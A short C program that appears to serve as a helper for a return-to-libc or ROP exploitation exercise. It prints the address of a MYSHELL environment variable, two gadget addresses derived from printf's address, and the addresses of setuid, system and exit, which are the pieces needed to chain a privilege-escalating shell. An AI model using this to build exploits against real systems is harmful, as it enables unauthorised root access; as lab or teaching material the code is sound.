#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char **argv){
	char* shell = getenv("MYSHELL");
	if (shell)
		printf("shell:%x\n", (unsigned)shell);
	unsigned base = (unsigned)printf;
	printf("gadget1:%x\n", base+0x1413-0x10b0);
	printf("gadget2:%x\n", base+0x1191-0x10b0);
	printf("setuid:%x\n", (unsigned)setuid);
	printf("system:%x\n", (unsigned)system);
	printf("exit:%x\n", (unsigned)exit);
}
